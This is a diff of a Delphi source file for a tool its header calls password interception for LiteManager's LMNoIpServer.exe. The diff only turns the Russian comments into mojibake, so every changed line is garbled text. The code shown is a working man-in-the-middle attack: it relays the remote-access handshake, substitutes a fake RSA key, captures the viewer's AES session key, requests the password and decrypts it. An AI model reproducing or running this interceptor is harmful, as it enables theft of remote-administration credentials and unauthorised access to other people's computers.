@@ -1,6 +1,6 @@
-(*
-  Перехват паролей для LMNoIpServer.exe
-  Использовать только в академических целях
+п»ї(*
+  РџРµСЂРµС…РІР°С‚ РїР°СЂРѕР»РµР№ РґР»СЏ LMNoIpServer.exe
+  РСЃРїРѕР»СЊР·РѕРІР°С‚СЊ С‚РѕР»СЊРєРѕ РІ Р°РєР°РґРµРјРёС‡РµСЃРєРёС… С†РµР»СЏС…
 *)
 unit MainForm;
 
@@ -126,7 +126,7 @@ begin
       Exit;
     end;
 
-    // Импортируем реальный открытый ключ от Server
+    // РРјРїРѕСЂС‚РёСЂСѓРµРј СЂРµР°Р»СЊРЅС‹Р№ РѕС‚РєСЂС‹С‚С‹Р№ РєР»СЋС‡ РѕС‚ Server
     FuncResult := CryptImportKey(
       CryptoProviderHandle,
       @APublicKeyData[0],
@@ -143,7 +143,7 @@ begin
 
     KeySize := 256;
 
-    // Генерируем AES ключ
+    // Р“РµРЅРµСЂРёСЂСѓРµРј AES РєР»СЋС‡
     FuncResult := CryptGenKey(
       CryptoProviderHandle,
       CALG_AES_256,
@@ -156,7 +156,7 @@ begin
       Exit;
     end;
 
-    // Извлекаем AES, определяем размер
+    // РР·РІР»РµРєР°РµРј AES, РѕРїСЂРµРґРµР»СЏРµРј СЂР°Р·РјРµСЂ
     FuncResult := CryptExportKey(
       SessionKey,
       PublicKey,
@@ -171,7 +171,7 @@ begin
       Exit;
     end;
 
-    // Данные AES ключа
+    // Р”Р°РЅРЅС‹Рµ AES РєР»СЋС‡Р°
     SetLength(ASessionKey, DataLen);
     FuncResult := CryptExportKey(
       SessionKey,
@@ -227,9 +227,9 @@ begin
 end;
 
 (*
-  Этот метод вызывается в отдельных потоках, при каждом соединении к нашему
-  перехватчику. В нем и обрабатываем трафик от клиентских и админских модулей LM,
-  перенаправляя его в LMNoIpServer.exe
+  Р­С‚РѕС‚ РјРµС‚РѕРґ РІС‹Р·С‹РІР°РµС‚СЃСЏ РІ РѕС‚РґРµР»СЊРЅС‹С… РїРѕС‚РѕРєР°С…, РїСЂРё РєР°Р¶РґРѕРј СЃРѕРµРґРёРЅРµРЅРёРё Рє РЅР°С€РµРјСѓ
+  РїРµСЂРµС…РІР°С‚С‡РёРєСѓ. Р’ РЅРµРј Рё РѕР±СЂР°Р±Р°С‚С‹РІР°РµРј С‚СЂР°С„РёРє РѕС‚ РєР»РёРµРЅС‚СЃРєРёС… Рё Р°РґРјРёРЅСЃРєРёС… РјРѕРґСѓР»РµР№ LM,
+  РїРµСЂРµРЅР°РїСЂР°РІР»СЏСЏ РµРіРѕ РІ LMNoIpServer.exe
 *)
 procedure TAppForm.SocketServerExecute(AContext: TIdContext);
 var
@@ -258,26 +258,26 @@ begin
 
     Client.Connect;
     try
-      // Единица обычно
+      // Р•РґРёРЅРёС†Р° РѕР±С‹С‡РЅРѕ
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
       if Val32 <> 1 then
         Exit;
 
-      // Скорее всего тип соединения
+      // РЎРєРѕСЂРµРµ РІСЃРµРіРѕ С‚РёРї СЃРѕРµРґРёРЅРµРЅРёСЏ
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
 
-      // Нас интересует тип соединения == 3, это канал Server <> NOIP
+      // РќР°СЃ РёРЅС‚РµСЂРµСЃСѓРµС‚ С‚РёРї СЃРѕРµРґРёРЅРµРЅРёСЏ == 3, СЌС‚Рѕ РєР°РЅР°Р» Server <> NOIP
       if Val32 <> 3 then
         Exit;
 
-      // Версия со стороны Viewer, например, 00 00 12 d4, то есть 4820
+      // Р’РµСЂСЃРёСЏ СЃРѕ СЃС‚РѕСЂРѕРЅС‹ Viewer, РЅР°РїСЂРёРјРµСЂ, 00 00 12 d4, С‚Рѕ РµСЃС‚СЊ 4820
       Val32 := Client.IOHandler.ReadInt32();
       //OutputDebug('Version: ' + Val32.ToString);
       AContext.Connection.IOHandler.Write(Int32(Val32));
 
-      // Версия со стороны Server
+      // Р’РµСЂСЃРёСЏ СЃРѕ СЃС‚РѕСЂРѕРЅС‹ Server
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
       //OutputDebug('Version Server: ' + Val32.ToString);
@@ -289,17 +289,17 @@ begin
       if Val32 <> 2 then
         Exit;
 
-      // Какая-то строка, обычно "--"
+      // РљР°РєР°СЏ-С‚Рѕ СЃС‚СЂРѕРєР°, РѕР±С‹С‡РЅРѕ "--"
       S := AContext.Connection.IOHandler.ReadLn();
       Client.IOHandler.WriteLn(S);
       //OutputDebug('Some string: ' + S);
 
-      // ID сохраним на будущее!
+      // ID СЃРѕС…СЂР°РЅРёРј РЅР° Р±СѓРґСѓС‰РµРµ!
       Id := AContext.Connection.IOHandler.ReadLn();
       Client.IOHandler.WriteLn(Id);
       //OutputDebug('ID: ' + Id);
 
-      // Проверим, есть ли ID в списке игнорирования
+      // РџСЂРѕРІРµСЂРёРј, РµСЃС‚СЊ Р»Рё ID РІ СЃРїРёСЃРєРµ РёРіРЅРѕСЂРёСЂРѕРІР°РЅРёСЏ
       FIgnoreListCS.Enter;
       try
         if FIgnoreList.IndexOf(Id) >= 0 then
@@ -308,86 +308,86 @@ begin
         FIgnoreListCS.Leave;
       end;
 
-      // ID в формате UTF-16 зачем-то
+      // ID РІ С„РѕСЂРјР°С‚Рµ UTF-16 Р·Р°С‡РµРј-С‚Рѕ
       S := AContext.Connection.IOHandler.ReadLn(IndyTextEncoding_UTF16LE);
       Client.IOHandler.WriteLn(S, IndyTextEncoding_UTF16LE);
       //OutputDebug('ID UTF-16: ' + S);
 
-      // Далее работа ведется не с NOIP, а с Server
-      // Скорее всего тип соединения, для авторизации это всегда 3
+      // Р”Р°Р»РµРµ СЂР°Р±РѕС‚Р° РІРµРґРµС‚СЃСЏ РЅРµ СЃ NOIP, Р° СЃ Server
+      // РЎРєРѕСЂРµРµ РІСЃРµРіРѕ С‚РёРї СЃРѕРµРґРёРЅРµРЅРёСЏ, РґР»СЏ Р°РІС‚РѕСЂРёР·Р°С†РёРё СЌС‚Рѕ РІСЃРµРіРґР° 3
       Val32 := Client.IOHandler.ReadInt32();
       AContext.Connection.IOHandler.Write(Int32(Val32));
 
-      // Если не 3, то нам не интересно
+      // Р•СЃР»Рё РЅРµ 3, С‚Рѕ РЅР°Рј РЅРµ РёРЅС‚РµСЂРµСЃРЅРѕ
       if Val32 <> 3 then
         Exit;
 
-      // Какой-то внутренний GUID
+      // РљР°РєРѕР№-С‚Рѕ РІРЅСѓС‚СЂРµРЅРЅРёР№ GUID
       S := Client.IOHandler.ReadLn();
       AContext.Connection.IOHandler.WriteLn();
       //OutputDebug('GUID: ' + S);
 
-      // Судя по всему, признак авторизации, всегда == 0 в интересующем нас сценарии
+      // РЎСѓРґСЏ РїРѕ РІСЃРµРјСѓ, РїСЂРёР·РЅР°Рє Р°РІС‚РѕСЂРёР·Р°С†РёРё, РІСЃРµРіРґР° == 0 РІ РёРЅС‚РµСЂРµСЃСѓСЋС‰РµРј РЅР°СЃ СЃС†РµРЅР°СЂРёРё
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
       if Val32 <> 0 then
         Exit;
 
-      // Магическая цифра 00 00 03 09 (777) со стороны Viewer
+      // РњР°РіРёС‡РµСЃРєР°СЏ С†РёС„СЂР° 00 00 03 09 (777) СЃРѕ СЃС‚РѕСЂРѕРЅС‹ Viewer
       Val32 := Client.IOHandler.ReadInt32();
       AContext.Connection.IOHandler.Write(Int32(Val32));
       //OutputDebug('777 - 1: ' + Val32.ToString);
       if Val32 <> 777 then
         Exit;
 
-      // Магическая цифра 00 00 03 09 (777) со стороны Server
+      // РњР°РіРёС‡РµСЃРєР°СЏ С†РёС„СЂР° 00 00 03 09 (777) СЃРѕ СЃС‚РѕСЂРѕРЅС‹ Server
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
       //OutputDebug('777 - 2: ' + Val32.ToString);
       if Val32 <> 777 then
         Exit;
 
-      // Опять версия, например, 00 00 12 d4 (4820)
+      // РћРїСЏС‚СЊ РІРµСЂСЃРёСЏ, РЅР°РїСЂРёРјРµСЂ, 00 00 12 d4 (4820)
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
 
-      // Какое-то число, обычно 00 00 00 01
+      // РљР°РєРѕРµ-С‚Рѕ С‡РёСЃР»Рѕ, РѕР±С‹С‡РЅРѕ 00 00 00 01
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
 
-      // Какое-то число, обычно 00 00 00 00
+      // РљР°РєРѕРµ-С‚Рѕ С‡РёСЃР»Рѕ, РѕР±С‹С‡РЅРѕ 00 00 00 00
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
 
-      // Какая-то обычно пустая строка, судя по признаку окончания 0d 0a
+      // РљР°РєР°СЏ-С‚Рѕ РѕР±С‹С‡РЅРѕ РїСѓСЃС‚Р°СЏ СЃС‚СЂРѕРєР°, СЃСѓРґСЏ РїРѕ РїСЂРёР·РЅР°РєСѓ РѕРєРѕРЅС‡Р°РЅРёСЏ 0d 0a
       S := AContext.Connection.IOHandler.ReadLn();
       Client.IOHandler.WriteLn(S);
 
-      // Скорее всего какая-то настройка авторизации,
-      // должна быть == 3 по нашему сценарию
+      // РЎРєРѕСЂРµРµ РІСЃРµРіРѕ РєР°РєР°СЏ-С‚Рѕ РЅР°СЃС‚СЂРѕР№РєР° Р°РІС‚РѕСЂРёР·Р°С†РёРё,
+      // РґРѕР»Р¶РЅР° Р±С‹С‚СЊ == 3 РїРѕ РЅР°С€РµРјСѓ СЃС†РµРЅР°СЂРёСЋ
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       Client.IOHandler.Write(Int32(Val32));
       if Val32 <> 3 then
         Exit;
 
-      // Номер версии со стороны Viewer
+      // РќРѕРјРµСЂ РІРµСЂСЃРёРё СЃРѕ СЃС‚РѕСЂРѕРЅС‹ Viewer
       Val32 := Client.IOHandler.ReadInt32();
       AContext.Connection.IOHandler.Write(Int32(Val32));
 
-      // 4 байта нулей
+      // 4 Р±Р°Р№С‚Р° РЅСѓР»РµР№
       Val32 := Client.IOHandler.ReadInt32();
       AContext.Connection.IOHandler.Write(Int32(Val32));
-      // Еще 4 байта нулей
+      // Р•С‰Рµ 4 Р±Р°Р№С‚Р° РЅСѓР»РµР№
       Val32 := Client.IOHandler.ReadInt32();
       AContext.Connection.IOHandler.Write(Int32(Val32));
 
-      // Начинается работа с RSA, нужно сгенерировать и подменить ключи
+      // РќР°С‡РёРЅР°РµС‚СЃСЏ СЂР°Р±РѕС‚Р° СЃ RSA, РЅСѓР¶РЅРѕ СЃРіРµРЅРµСЂРёСЂРѕРІР°С‚СЊ Рё РїРѕРґРјРµРЅРёС‚СЊ РєР»СЋС‡Рё
 
-      // Размер данных RSA балока, но пока не отсылаем его!
+      // Р Р°Р·РјРµСЂ РґР°РЅРЅС‹С… RSA Р±Р°Р»РѕРєР°, РЅРѕ РїРѕРєР° РЅРµ РѕС‚СЃС‹Р»Р°РµРј РµРіРѕ!
       Val32 := AContext.Connection.IOHandler.ReadInt32;
       //OutputDebug('RSA open key size: ' + Val32.ToString);
 
-      // Считываем данные RSA блока, но не отсылаем их!
+      // РЎС‡РёС‚С‹РІР°РµРј РґР°РЅРЅС‹Рµ RSA Р±Р»РѕРєР°, РЅРѕ РЅРµ РѕС‚СЃС‹Р»Р°РµРј РёС…!
       Data := TMemoryStream.Create;
       try
         AContext.Connection.IOHandler.ReadStream(Data, Val32);
@@ -398,14 +398,14 @@ begin
         FreeAndNil(Data);
       end;
 
-      // Импортируем реальный RSA ключ и сгенерируем AES (делаем работу вместо реального Viewer)
+      // РРјРїРѕСЂС‚РёСЂСѓРµРј СЂРµР°Р»СЊРЅС‹Р№ RSA РєР»СЋС‡ Рё СЃРіРµРЅРµСЂРёСЂСѓРµРј AES (РґРµР»Р°РµРј СЂР°Р±РѕС‚Сѓ РІРјРµСЃС‚Рѕ СЂРµР°Р»СЊРЅРѕРіРѕ Viewer)
       if not GenerateRealSessionKey(RealPublicKeyData, RealSessionKeyData) then
       begin
         OutputDebug('GenerateRealSessionKey error');
         Exit;
       end;
 
-      // Генерируем новый (fake) RSA блок и отсылаем его вместо старого
+      // Р“РµРЅРµСЂРёСЂСѓРµРј РЅРѕРІС‹Р№ (fake) RSA Р±Р»РѕРє Рё РѕС‚СЃС‹Р»Р°РµРј РµРіРѕ РІРјРµСЃС‚Рѕ СЃС‚Р°СЂРѕРіРѕ
       FCryptoAPICS.Enter;
       try
         FuncResult := CryptAcquireContext(
@@ -423,7 +423,7 @@ begin
 
         KeySize := 2048;
 
-        // Создаем новые открытый и закрытый ключи
+        // РЎРѕР·РґР°РµРј РЅРѕРІС‹Рµ РѕС‚РєСЂС‹С‚С‹Р№ Рё Р·Р°РєСЂС‹С‚С‹Р№ РєР»СЋС‡Рё
         FuncResult := CryptGenKey(
           CryptoProviderHandle,
           AT_KEYEXCHANGE,
@@ -436,7 +436,7 @@ begin
           Exit;
         end;
 
-        // Извлекаем открытый ключ, определяем размер
+        // РР·РІР»РµРєР°РµРј РѕС‚РєСЂС‹С‚С‹Р№ РєР»СЋС‡, РѕРїСЂРµРґРµР»СЏРµРј СЂР°Р·РјРµСЂ
         FuncResult := CryptExportKey(
           FakePublicKey,
           0,
@@ -451,7 +451,7 @@ begin
           Exit;
         end;
 
-        // Данные открытого ключа
+        // Р”Р°РЅРЅС‹Рµ РѕС‚РєСЂС‹С‚РѕРіРѕ РєР»СЋС‡Р°
         SetLength(PublicKeyData, DataLen);
         FuncResult := CryptExportKey(
           FakePublicKey,
@@ -470,78 +470,78 @@ begin
         FCryptoAPICS.Leave;
       end;
 
-      // Отсылаем на Viewer новый RSA блок
+      // РћС‚СЃС‹Р»Р°РµРј РЅР° Viewer РЅРѕРІС‹Р№ RSA Р±Р»РѕРє
       Data := TMemoryStream.Create;
       try
         Data.Write(PublicKeyData[0], Length(PublicKeyData));
         Data.Position := 0;
 
-         // Размер нового блока RSA
+         // Р Р°Р·РјРµСЂ РЅРѕРІРѕРіРѕ Р±Р»РѕРєР° RSA
         Val32 := Data.Size;
         //OutputDebug('RSA open key NEW size: ' + Val32.ToString);
         Client.IOHandler.Write(Int32(Val32));
-        // Данные
+        // Р”Р°РЅРЅС‹Рµ
         Client.IOHandler.Write(Data, Data.Size);
       finally
         FreeAndNil(Data);
       end;
 
-      // Считываем размер AES ключа
+      // РЎС‡РёС‚С‹РІР°РµРј СЂР°Р·РјРµСЂ AES РєР»СЋС‡Р°
       Size := Client.IOHandler.ReadInt32();
 
-      // Отсылаем раземр реального AES ключа на Server
+      // РћС‚СЃС‹Р»Р°РµРј СЂР°Р·РµРјСЂ СЂРµР°Р»СЊРЅРѕРіРѕ AES РєР»СЋС‡Р° РЅР° Server
       Val32 := Length(RealSessionKeyData);
       AContext.Connection.IOHandler.Write(Int32(Val32));
 
       Data := TMemoryStream.Create;
       PasswordData := TMemoryStream.Create;
       try
-        // Считываем AES ключ
+        // РЎС‡РёС‚С‹РІР°РµРј AES РєР»СЋС‡
         Client.IOHandler.ReadStream(Data, Size);
         //OutputDebug('AES key from Viewer: ' + Val32.ToString);
 
-        // Сохраним данные AES ключа
+        // РЎРѕС…СЂР°РЅРёРј РґР°РЅРЅС‹Рµ AES РєР»СЋС‡Р°
         SetLength(SessionKeyData, Data.Size);
         Data.Position := 0;
         Data.Read(SessionKeyData, Data.Size);
 
-        // Отсылаем реальный AES ключ на Server
+        // РћС‚СЃС‹Р»Р°РµРј СЂРµР°Р»СЊРЅС‹Р№ AES РєР»СЋС‡ РЅР° Server
         Data.Clear;
         Data.Write(RealSessionKeyData, Length(RealSessionKeyData));
         Data.Position := 0;
         AContext.Connection.IOHandler.Write(Data, Data.Size);
 
-        // У нас реализован только перехват безопасности по паролю
-        // В LM есть и другие виды безопасности, нас интересует == 1
+        // РЈ РЅР°СЃ СЂРµР°Р»РёР·РѕРІР°РЅ С‚РѕР»СЊРєРѕ РїРµСЂРµС…РІР°С‚ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё РїРѕ РїР°СЂРѕР»СЋ
+        // Р’ LM РµСЃС‚СЊ Рё РґСЂСѓРіРёРµ РІРёРґС‹ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё, РЅР°СЃ РёРЅС‚РµСЂРµСЃСѓРµС‚ == 1
         Val32 := AContext.Connection.IOHandler.ReadInt32;
         if Val32 <> 1 then
         begin
-          // Следующие разы этот ID не перехватываем
+          // РЎР»РµРґСѓСЋС‰РёРµ СЂР°Р·С‹ СЌС‚РѕС‚ ID РЅРµ РїРµСЂРµС…РІР°С‚С‹РІР°РµРј
           IgnoreId(Id);
           Exit;
         end;
 
-        // С Server больше не работаем, все, что необходимо уже получено
+        // РЎ Server Р±РѕР»СЊС€Рµ РЅРµ СЂР°Р±РѕС‚Р°РµРј, РІСЃРµ, С‡С‚Рѕ РЅРµРѕР±С…РѕРґРёРјРѕ СѓР¶Рµ РїРѕР»СѓС‡РµРЅРѕ
 
-        // Запросим пароль
+        // Р—Р°РїСЂРѕСЃРёРј РїР°СЂРѕР»СЊ
         Client.IOHandler.Write(Int32(1));
 
-        // Считываем размер данных с зашифрованным паролем
+        // РЎС‡РёС‚С‹РІР°РµРј СЂР°Р·РјРµСЂ РґР°РЅРЅС‹С… СЃ Р·Р°С€РёС„СЂРѕРІР°РЅРЅС‹Рј РїР°СЂРѕР»РµРј
         Val32 := Client.IOHandler.ReadInt32();
-        // Считываем зашифрованный пароль
+        // РЎС‡РёС‚С‹РІР°РµРј Р·Р°С€РёС„СЂРѕРІР°РЅРЅС‹Р№ РїР°СЂРѕР»СЊ
         Client.IOHandler.ReadStream(PasswordData, Val32);
 
-        // Далее с сетью больше не работаем в этом потоке и игнорируем в будущем этот ID
+        // Р”Р°Р»РµРµ СЃ СЃРµС‚СЊСЋ Р±РѕР»СЊС€Рµ РЅРµ СЂР°Р±РѕС‚Р°РµРј РІ СЌС‚РѕРј РїРѕС‚РѕРєРµ Рё РёРіРЅРѕСЂРёСЂСѓРµРј РІ Р±СѓРґСѓС‰РµРј СЌС‚РѕС‚ ID
         IgnoreId(Id);
 
-        // Восстановим данные AES ключа
+        // Р’РѕСЃСЃС‚Р°РЅРѕРІРёРј РґР°РЅРЅС‹Рµ AES РєР»СЋС‡Р°
         Data.Clear;
         Data.Write(SessionKeyData, Length(SessionKeyData));
         Data.Position := 0;
 
         FCryptoAPICS.Enter;
         try
-          // Импорт AES ключа
+          // РРјРїРѕСЂС‚ AES РєР»СЋС‡Р°
           FuncResult := CryptImportKey(
             CryptoProviderHandle,
             Data.Memory,
@@ -559,7 +559,7 @@ begin
           PasswordData.Position := 0;
           DataLen := PasswordData.Size;
 
-          // Пробуем расшифровать пароль AES ключом
+          // РџСЂРѕР±СѓРµРј СЂР°СЃС€РёС„СЂРѕРІР°С‚СЊ РїР°СЂРѕР»СЊ AES РєР»СЋС‡РѕРј
           FuncResult := CryptDecrypt(
             SessionKey,
             0,
@@ -592,7 +592,7 @@ begin
       end;
 
     finally
-      // Проксирование трафика, без изменений и анализа, в LMNoIpServer.exe
+      // РџСЂРѕРєСЃРёСЂРѕРІР°РЅРёРµ С‚СЂР°С„РёРєР°, Р±РµР· РёР·РјРµРЅРµРЅРёР№ Рё Р°РЅР°Р»РёР·Р°, РІ LMNoIpServer.exe
       Data := TMemoryStream.Create;
       try
         while (AContext.Connection.Connected) and (Client.Connected) do
@@ -675,7 +675,7 @@ begin
 
   StatusBar.SimpleText := 'Context count: ' + SocketServer.Contexts.Count.ToString;
 
-  // Скролл вниз
+  // РЎРєСЂРѕР»Р» РІРЅРёР·
   SendMessage(Output.Handle, EM_LINESCROLL, 0, Output.Lines.Count);
 end;
 
